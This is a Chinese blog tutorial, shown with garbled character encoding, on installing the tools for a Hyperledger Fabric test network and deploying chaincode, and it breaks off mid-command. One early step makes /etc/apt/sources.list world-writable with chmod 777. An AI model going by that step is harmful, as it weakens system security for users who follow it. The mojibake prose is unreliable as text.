    <content type="html"><![CDATA[<h2 id="å‚è€ƒæ•™ç¨‹"><a href="#å‚è€ƒæ•™ç¨‹" class="headerlink" title="å‚è€ƒæ•™ç¨‹"></a>å‚è€ƒæ•™ç¨‹</h2><p><a href="https://juejin.cn/post/7033235760392175629#heading-1">Fabricæµ‹è¯•ç¯å¢ƒçš„æ­å»ºæµç¨‹ - æ˜é‡‘ (juejin.cn)</a></p><p><a href="https://blog.csdn.net/u013137970/article/details/112634474">æ­å»ºfabricå¼€å‘ç¯å¢ƒ</a></p><h2 id="å‰æç¯å¢ƒå‡†å¤‡"><a href="#å‰æç¯å¢ƒå‡†å¤‡" class="headerlink" title="å‰æç¯å¢ƒå‡†å¤‡"></a>å‰æç¯å¢ƒå‡†å¤‡</h2><h3 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs groovy">lsb_release -a | grep Codename | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> <span class="hljs-comment">//æŸ¥çœ‹ubuntuçš„Codename</span><br><br>sudo cp <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list /</span>etc<span class="hljs-regexp">/apt/</span>sources.list.b <span class="hljs-comment">// å¤‡ä»½åŸå§‹æ–‡ä»¶</span><br><br>sudo chmod <span class="hljs-number">777</span> <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list  /</span>/ ä¿®æ”¹æ–‡ä»¶æƒé™<br><br>sudo vi <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list /</span>/ ç”¨ vim æ‰“å¼€æ–‡ä»¶ï¼Œåˆ é™¤æ–‡ä»¶ä¸­æ‰€æœ‰å†…å®¹ï¼Œæ›¿æ¢ä¸ºä»¥ä¸‹å¯¹åº”å†…å®¹<br></code></pre></td></tr></table></figure><p><strong>å›½å†…çš„å‡ ä¸ªæºï¼š</strong><br><a href="http://mirrors.aliyun.com/">é˜¿é‡Œæº</a><br><a href="http://mirrors.ustc.edu.cn/">ä¸­ç§‘å¤§æº</a><br><a href="http://mirrors.163.com/">163æº</a><br><a href="http://mirrors.tuna.tsinghua.edu.cn/">æ¸…åæº</a></p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-comment">//æˆ‘è¿™é‡Œéœ€è¦ç¿»å¢™æ‰èƒ½æ‰§è¡Œ</span><br>sudo apt <span class="hljs-keyword">update</span><br><br>sudo apt upgrade<br><br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> git<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…cURL"><a href="#å®‰è£…cURL" class="headerlink" title="å®‰è£…cURL"></a>å®‰è£…cURL</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> curl<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…Docker"><a href="#å®‰è£…Docker" class="headerlink" title="å®‰è£…Docker"></a>å®‰è£…Docker</h3><p>æŸ¥çœ‹ç³»ç»Ÿä¸­æ˜¯å¦å·²ç»å®‰è£…Dockerï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p> ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…Dockerçš„æœ€æ–°ç‰ˆæœ¬ï¼š</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> docker.io<br></code></pre></td></tr></table></figure><p> æŸ¥çœ‹Dockerç‰ˆæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸ºå½“å‰ç”¨æˆ·:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> usermod -aG docker ç”¨æˆ·å<br></code></pre></td></tr></table></figure><p>æ³¨é”€é‡å¯:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…Docker-compose"><a href="#å®‰è£…Docker-compose" class="headerlink" title="å®‰è£…Docker-compose"></a>å®‰è£…Docker-compose</h3><p>ç¡®å®šç³»ç»Ÿä¸­æ˜¯å¦å·²å®‰è£…dockerï¼composeå·¥å…·ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker-compose <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p> å¦‚ç³»ç»Ÿæç¤ºæœªå®‰è£…ï¼Œåˆ™ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…docker-composeå·¥å…·ï¼š</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> docker-compose<br></code></pre></td></tr></table></figure><p> å®‰è£…æˆåŠŸåï¼ŒæŸ¥çœ‹Dockerï¼Composeç‰ˆæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker-compose <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…Golang"><a href="#å®‰è£…Golang" class="headerlink" title="å®‰è£…Golang"></a>å®‰è£…Golang</h3><p>åˆ›å»ºGoç›®å½•</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">mkdir</span> $HOME/<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨wgetå·¥å…·ä¸‹è½½Golangçš„æœ€æ–°ç‰ˆæœ¬å‹ç¼©åŒ…æ–‡ä»¶ go1.14.4.linux-amd64.tar.gz</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.google.com/go/go<span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">4</span>.linux-amd<span class="hljs-number">64</span>.tar.gz<br></code></pre></td></tr></table></figure><p>ä¸‹è½½å®Œæˆåï¼Œæ–‡ä»¶ä¼šä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹ã€‚å¯ä»¥ä½¿ç”¨ ll å‘½ä»¤æŸ¥çœ‹</p><p>ä½¿ç”¨ tar å‘½ä»¤å°†ä¸‹è½½åçš„å‹ç¼©åŒ…æ–‡ä»¶è§£å‹åˆ°æŒ‡å®šçš„ /usr/local/ è·¯å¾„ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tar -zxvf go<span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">4</span>.linux-amd<span class="hljs-number">64</span>.tar.gz -C /usr/local/<br></code></pre></td></tr></table></figure><p>é…ç½®ç¯å¢ƒå˜é‡ï¼šè§£å‹åï¼ŒGolangå¯ä»¥è®©ç³»ç»Ÿçš„æ‰€æœ‰ç”¨æˆ·æ­£å¸¸ä½¿ç”¨ï¼Œ æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ vim æ–‡ä»¶ç¼–è¾‘å·¥å…·æ‰“å¼€ç³»ç»Ÿçš„ profile æ–‡ä»¶è¿›è¡Œç¼–è¾‘ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/etc/</span>profile<br></code></pre></td></tr></table></figure><p> åœ¨profileæ–‡ä»¶æœ€åæ·»åŠ å¦‚ä¸‹å†…å®¹:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOPATH</span>=<span class="hljs-variable">$HOME</span>/go<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOROOT</span>=/usr/local/go<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$GOROOT</span>/bin:$PATH<br></code></pre></td></tr></table></figure><p> ä½¿ç”¨ source å‘½ä»¤ï¼Œä½¿åˆšåˆšæ·»åŠ çš„é…ç½®ä¿¡æ¯ç”Ÿæ•ˆï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br></code></pre></td></tr></table></figure><p> é€šè¿‡ go versionå‘½ä»¤éªŒè¯æ˜¯å¦æˆåŠŸï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…make"><a href="#å®‰è£…make" class="headerlink" title="å®‰è£…make"></a>å®‰è£…make</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sudo apt install make<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…g"><a href="#å®‰è£…g" class="headerlink" title="å®‰è£…g++"></a>å®‰è£…g++</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sudo apt install g++<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…libltdl-dev-åº“"><a href="#å®‰è£…libltdl-dev-åº“" class="headerlink" title="å®‰è£…libltdl-dev åº“"></a>å®‰è£…<code>libltdl-dev</code> åº“</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sudo apt-get install libltdl-dev<br></code></pre></td></tr></table></figure><h2 id="ä¸€é”®å¼éƒ¨ç½²Fabric"><a href="#ä¸€é”®å¼éƒ¨ç½²Fabric" class="headerlink" title="ä¸€é”®å¼éƒ¨ç½²Fabric"></a>ä¸€é”®å¼éƒ¨ç½²Fabric</h2><p>æ–°å»ºä¸€ä¸ªç›®å½•å¹¶è¿›å…¥ï¼š</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">mkdir</span> hyperledger-fabric &amp;&amp; <span class="hljs-built_in">cd</span> hyperledger-fabric<br></code></pre></td></tr></table></figure><p>ä¸‹è½½æ‰§è¡Œè„šæœ¬ï¼Œæ­¤è„šæœ¬ç”¨æ¥è‡ªåŠ¨åŒ–ä¸‹è½½ fabric é•œåƒã€ç¨‹åºå’Œæµ‹è¯•ç½‘è¿è¡Œè„šæœ¬ç­‰å·¥å…·ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/master/</span>scripts/bootstrap.sh<br></code></pre></td></tr></table></figure><p>ç»™è„šæœ¬æ·»åŠ æ‰§è¡Œæƒé™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x bootstrap.sh<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œè„šæœ¬ï¼ŒæŒ‡å®šä¸‹è½½ v1.3.0 ç‰ˆæœ¬çš„ç›¸å…³å·¥å…·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./bootstrap.sh 1.3.0 1.3.0<br></code></pre></td></tr></table></figure><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709143056454.png" alt="image-20220709143056454"></p><p>å°†fabric-samplesä¸­çš„å¯æ‰§è¡Œç¨‹åºçš„è·¯å¾„æ·»åŠ åˆ°å…¨å±€ä¸‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=/home/sissice/hyperledger-fabric/fabric-samples/bin:$PATH<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/../bin:$PATH<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">FABRIC_CFG_PATH</span>=<span class="hljs-variable">$PWD</span>/../config/<br></code></pre></td></tr></table></figure><h2 id="æµ‹è¯•ç¯å¢ƒæ­å»º"><a href="#æµ‹è¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æµ‹è¯•ç¯å¢ƒæ­å»º"></a>æµ‹è¯•ç¯å¢ƒæ­å»º</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> fabric<span class="hljs-literal">-samples</span>/<span class="hljs-built_in">test-network</span><br></code></pre></td></tr></table></figure><p>è¯¥ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>network.sh</code>è„šæœ¬ï¼Œå¯ä»¥æ‹‰èµ·ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå…·ä½“å¦‚ä½•ä½¿ç”¨å¯ä»¥å‚è€ƒ<code>./network.sh --help</code></p><p>æ‰§è¡Œ<code>./network.sh up </code>,è„šæœ¬å°†å¸®æˆ‘ä»¬è‡ªåŠ¨æ‹‰èµ·ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒ</p><p>å¯ä»¥ç”¨ <code>docker ps</code> æŸ¥çœ‹å®¹å™¨çŠ¶æ€</p><p>ç”¨ <code>docker container rm xxx</code> åˆ é™¤</p><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709162901961.png" alt="image-20220709162901961"></p><p><code>./network.sh up </code> è¯¥è„šæœ¬å°†åˆ›å»ºå‡ºä¸€ä¸ª<code>order</code>èŠ‚ç‚¹ï¼Œä¸¤ä¸ª<code>peer</code>èŠ‚ç‚¹ï¼Œä¸€ä¸ª<code>cli</code>å®¹å™¨ï¼Œç”¨æ¥å’Œå…¶ä»–èŠ‚ç‚¹è¿›è¡Œäº¤äº’æ“ä½œã€‚</p><p>ä½†æ˜¯ä¸ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬åˆ›å»ºé€šé“ï¼Œå¦‚æœéœ€è¦è‡ªåŠ¨å¸®æˆ‘ä»¬åˆ›å»ºé€šé“ï¼Œå¯ä»¥æŸ¥çœ‹<code>network.sh</code>çš„å¸®åŠ©æ–‡æ¡£,æ¯”å¦‚ï¼Œåˆ›å»ºé€šé“çš„å‘½ä»¤ä¸º<code>./network.sh createChannel</code></p><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709164626988.png" alt="image-20220709164626988"></p><p>è‡³æ­¤ï¼Œä½ å°±å¯ä»¥éƒ¨ç½²æ™ºèƒ½åˆçº¦äº†</p><h2 id="chaincodeæ“ä½œæµç¨‹"><a href="#chaincodeæ“ä½œæµç¨‹" class="headerlink" title="chaincodeæ“ä½œæµç¨‹"></a>chaincodeæ“ä½œæµç¨‹</h2><p><a href="https://hyperledger-fabric.readthedocs.io/en/release-2.2/test_network.html#">å®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://juejin.cn/post/7049546118161498120#heading-0">Fabric chaincodeæ“ä½œæµç¨‹</a></p><h3 id="å¯åŠ¨æµ‹è¯•ç¯å¢ƒå¹¶åˆ›å»ºé€šé“"><a href="#å¯åŠ¨æµ‹è¯•ç¯å¢ƒå¹¶åˆ›å»ºé€šé“" class="headerlink" title="å¯åŠ¨æµ‹è¯•ç¯å¢ƒå¹¶åˆ›å»ºé€šé“"></a>å¯åŠ¨æµ‹è¯•ç¯å¢ƒå¹¶åˆ›å»ºé€šé“</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> fabric<span class="hljs-literal">-samples</span>/<span class="hljs-built_in">test-network</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ï¼Œä¼šåˆ›å»ºä¸¤ä¸ªorgç»„ç»‡ï¼Œä¸€ä¸ªorderèŠ‚ç‚¹ï¼Œå¹¶ä¸”åˆ›å»ºä¸€ä¸ªé€šé“<code>channel1</code>ï¼Œå¹¶å°†ä¸¤ä¸ªorgç»„ç»‡çš„peerèŠ‚ç‚¹åŠ å…¥åˆ°channel1ä¸­ï¼Œå¹¶ä¸”è®¾ç½®anchor peeré”šèŠ‚ç‚¹ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">./network.<span class="hljs-keyword">sh</span> <span class="hljs-keyword">up</span> createChannel -<span class="hljs-keyword">c</span> channel1<br></code></pre></td></tr></table></figure><h3 id="æ‰“åŒ…chaincode"><a href="#æ‰“åŒ…chaincode" class="headerlink" title="æ‰“åŒ…chaincode"></a>æ‰“åŒ…chaincode</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer lifecycle chaincode package basic.tar.gz <span class="hljs-params">--path</span> <span class="hljs-string">../asset-transfer-basic/chaincode-go/</span> <span class="hljs-params">--lang</span> golang <span class="hljs-params">--label</span> basic_1.0<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‘½ä»¤ä¼šå°†åˆçº¦ä»£ç æ‰“åŒ…æˆ<code>tar</code>æ–‡ä»¶,<code>--path</code>æŒ‡å®šä»£ç æ–‡ä»¶çš„è·¯å¾„ï¼Œ<code>label</code>æ˜¯æ‰“åŒ…çš„æ ‡ç­¾ï¼Œè¿™ä¸ªæ ‡ç­¾åœ¨åç»­ä¸­ä¼šä½¿ç”¨åˆ°ã€‚</p><h3 id="å®‰è£…chaincode"><a href="#å®‰è£…chaincode" class="headerlink" title="å®‰è£…chaincode"></a>å®‰è£…chaincode</h3><p>é¦–å…ˆåœ¨org1ç»„ç»‡ä¸­è¿›è¡Œå®‰è£…</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install basic.tar.gz<br></code></pre></td></tr></table></figure><p>åœ¨org2ä¸­å®‰è£…</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test-network git:(ad8fc2f) âœ— <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:9051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install basic.tar.gz<br><br></code></pre></td></tr></table></figure><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709214302474.png" alt="image-20220709214302474"></p><p>è§£å†³ï¼š</p><p>å°†å·¥ä½œåŒºçš„<code>bin</code>å­ç›®å½•æ·»åŠ åˆ°<code>PATH</code>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$(go env GOPATH)/bin<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOPATH</span>=$(go env GOPATH)ã€‚<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹GOPATH</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vim /etc<span class="hljs-built_in">/profile</span><br><span class="hljs-built_in"></span><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOROOT</span>=/usr/local/go  #è®¾ç½®ä¸ºgoå®‰è£…çš„è·¯å¾„ï¼Œæœ‰äº›å®‰è£…åŒ…ä¼šè‡ªåŠ¨è®¾ç½®é»˜è®¤çš„goroot<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOPATH</span>=<span class="hljs-variable">$HOME</span>/gocode   #é»˜è®¤å®‰è£…åŒ…çš„è·¯å¾„<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$GOROOT/bin:$GOPATH/bin<br>source /etc/profile<br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œè§£å†³æ–¹æ¡ˆï¼Œåˆ°é“¾ç æ‰€åœ¨çš„ç›®å½•ä¸‹æå‰ä¸‹è½½ä¾èµ–åŒ…</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> fabric-samples/asset-transfer-basic/chaincode-<span class="hljs-keyword">go</span><br><br><span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GOPROXY=http<span class="hljs-variable">s:</span>//goproxy.io,direct<br><span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GO111MODULE=<span class="hljs-keyword">on</span><br><span class="hljs-keyword">go</span> <span class="hljs-keyword">mod</span> vendor<br></code></pre></td></tr></table></figure><p>å†é‡æ–°æ‰“åŒ…æ™ºèƒ½åˆçº¦å¹¶å®‰è£…é“¾ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">peer lifecycle chaincode package basic.tar.gz --path ../asset-transfer-basic/chaincode-go/ --lang golang --label basic_1<span class="hljs-number">.0</span><br>peer lifecycle chaincode install basic.tar.gz<br></code></pre></td></tr></table></figure><h3 id="Approve-chaincode"><a href="#Approve-chaincode" class="headerlink" title="Approve chaincode"></a>Approve chaincode</h3><p>æŸ¥çœ‹ä¸€ä¸‹chaincodeæ˜¯å¦å·²ç»å®‰è£…åˆ°å½“å‰ç»„ç»‡</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">âœ  <span class="hljs-keyword">test</span>-network git:(ad8fc2f) âœ— peer lifecycle chaincode queryinstalled<br><br>Installed chaincodes <span class="hljs-keyword">on</span> peer:<br><br>Package ID: basic_1.0:950c4b082bc8229268015e94e544db76afeb7086fbb52980387bd5e1bd0b41b3, <span class="hljs-keyword">Label</span>: basic_1.0<br></code></pre></td></tr></table></figure><p>è®¾ç½®<code>CC_PACKAGE_ID</code>,</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">export</span> CC_PACKAGE_ID=basic_<span class="hljs-number">1</span>.<span class="hljs-number">0</span>:<span class="hljs-number">950</span>c<span class="hljs-number">4</span>b<span class="hljs-number">082</span>bc<span class="hljs-number">8229268015</span>e<span class="hljs-number">94</span>e<span class="hljs-number">544</span>db<span class="hljs-number">76</span>afeb<span class="hljs-number">7086</span>fbb<span class="hljs-number">52980387</span>bd<span class="hljs-number">5</span>e<span class="hljs-number">1</span>bd<span class="hljs-number">0</span>b<span class="hljs-number">41</span>b<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œï¼ˆæ­¤æ—¶æ˜¯åœ¨org2ï¼‰</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br><br></code></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ°org1åï¼Œå†æ¬¡æ‰§è¡Œapproveæ“ä½œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/Admin@org1.example.com/m</span>sp<br><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls/ca.crt<br><br>export CORE_PEER_ADDRESS=localhost:<span class="hljs-number">7051</span><br><br>peer 